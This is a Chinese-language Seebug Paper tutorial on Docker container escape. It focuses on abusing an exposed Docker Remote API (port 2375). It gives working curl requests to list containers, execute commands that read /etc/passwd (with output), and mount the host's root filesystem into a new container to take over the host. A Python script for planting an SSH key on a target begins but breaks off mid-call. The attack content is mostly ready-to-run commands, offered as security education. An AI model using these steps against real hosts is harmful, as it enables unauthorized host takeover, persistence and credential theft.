**作者：tom0li**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！  
投稿邮箱：PI:EMAIL**
# 0x00 容器101
docker 启动的调用链如下:
docker-client -> dockerd -> docker-containerd -> docker-containerd-shim ->
runc（容器外） -> runc（容器内） -> containter-entrypoint
Docker利用Linux Namespace实现了操作系统级的资源隔离.  
逃逸思路:
    用户层: 用户配置不当
    服务层: 容器服务自身缺陷
    系统层: Linux内核漏洞
判断容器命令(不是全部适用)  
systemd-detect-virt -c sudo readlink /proc/1/exe
# 0x01 用户配置不当导致隔离失效
前提:
    root权限启动docker
    主机上有镜像,或自己下载镜像
    API版本大于1.5
查看client server 版本信息
## 0x01.1 docker.sock暴露到公网
### docker swarm简述
docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote
API的服务，可以通过HTTP、Python、调用API来操作Docker。
起因  
官方推荐启动方式如下
    sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
按推荐启动，在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。 官方使用指南如下
> AWS uses a "security group" to allow specific types of network traffic on
> your VPC network. The default security group’s initial set of rules deny all
> inbound traffic, allow all outbound traffic, and allow all traffic between
> instances.
说的是如果在AWS VPC 上使用的，禁止入站访问，不受影响。
Tip: 影响不只是2375端口，其他https 2376 port etc.
### 利用方法一 HTTP curl api
* * *
#### 在容器上获取 RCE
1）列出所有容器  
第一步是获取主机上所有容器的列表.  
Curl 命令:
    curl -i -s -X GET http://:PORT/containers/json
响应：
    HTTP/1.1 200 OK
    Api-Version: 1.39
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.4 (linux)
    Date: Thu, 04 Apr 2019 05:56:03 GMT
    Content-Length: 1780
    [
        {
            "Id":"a4621ceab3729702f18cfe852003489341e51e036d13317d8e7016facb8ebbaf",
            "Names":["/another_container"],
            "Image":"ubuntu:latest",
            "ImageID":"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499",
            "Command":"bash",
            "Created":1554357359,
            "Ports":[],
            "Labels":{},
            "State":"running",
            "Status":"Up 3 seconds",
            "HostConfig":{"NetworkMode":"default"},
            "NetworkSettings":{"Networks": 
            ...
注意响应中的"Id"字段，因为下一个命令将会用到它。
2) 创建一个 exec 接下来，我们需要创建一个将在容器上执行的"exec"实例。你可以在此处输入要运行的命令。  
请求中的以下项目需要在请求中进行更改：
Container ID Docker Host Port Cmd（我的示例中将 cat /etc/passwd）
    POST /containers//exec HTTP/1.1
    Host: :PORT
    Content-Type: application/json
    Content-Length: 188
    {
      "AttachStdin": true,
      "AttachStdout": true,
      "AttachStderr": true,
      "Cmd": ["cat", "/etc/passwd"],
      "DetachKeys": "ctrl-p,ctrl-q",
      "Privileged": true,
      "Tty": true
    }
Curl 命令：
    curl -i -s -X POST \
    -H "Content-Type: application/json" \
    --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
    http://:PORT/containers//exec
响应：
    HTTP/1.1 201 Created
    Api-Version: 1.39
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.4 (linux)
    Date: Fri, 05 Apr 2019 00:51:31 GMT
    Content-Length: 74
    {"Id":"8b5e4c65e182cec039d38ddb9c0a931bbba8f689a4b3e1be1b3e8276dd2d1916"}
注意响应中的"Id"字段，因为下一个命令将会用到它。
3）启动 exec 现在创建了"exec"，我们需要运行它。
你需要更改请求中的以下项目：
Exec ID Docker Host Port
    POST /exec//start HTTP/1.1
    Host: :PORT
    Content-Type: application/json
    {
     "Detach": false,
     "Tty": false
    }
Curl 命令：
    curl -i -s -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"Detach": false,"Tty": false}' \
    http://:PORT/exec//start
响应：
    HTTP/1.1 200 OK
    Content-Type: application/vnd.docker.raw-stream
    Api-Version: 1.39
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.4 (linux)
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
#### 接管主机
启动一个docker容器，主机的根目录安装到容器的一个卷上，这样就可以对主机的文件系统执行命令。由于本文中所讨论的漏洞允许你完全的控制API，因此可以控制docker主机。
注意：不要忘记更改dockerhost，port和containerID
1）下载 ubuntu 镜像
    curl -i -s -k  -X 'POST' \
    -H 'Content-Type: application/json' \
    http://:PORT/images/create?fromImage=ubuntu&tag=latest
2）使用已安装的卷创建容器
    curl -i -s -k  -X 'POST' \
    -H 'Content-Type: application/json' \
    --data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "ubuntu","Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}' \
    http://:PORT/containers/create
3）启动容器
    curl -i -s -k  -X 'POST' \
    -H 'Content-Type: application/json' \
    http://:PORT/containers//start
至此，你可以利用代码执行漏洞对新容器运行命令。如果要对Host OS运行命令，请不要忘记添加chroot/hostos。
### 利用方法二 Docker python api
写入ssh密钥
    # coding:utf-8
    import docker
    import socks
    import socket
    import sys
    import re
    #开启代理
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 1081)
    #socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 1081)
    socket.socket = socks.socksocket
    ip = '172.16.145.165'
    cli = docker.DockerClient(base_url='tcp://'+ip+':2375', version='auto') 
    #端口不一定为2375，指定version参数是因为本机和远程主机的API版本可能不同，指定为auto可以自己判断版本
    image = cli.images.list()[0]
    #读取生成的公钥
    f = open('id_rsa_2048.pub', 'r')
    sshKey = f.read()
    f.close()
    try:
        cli.containers.run(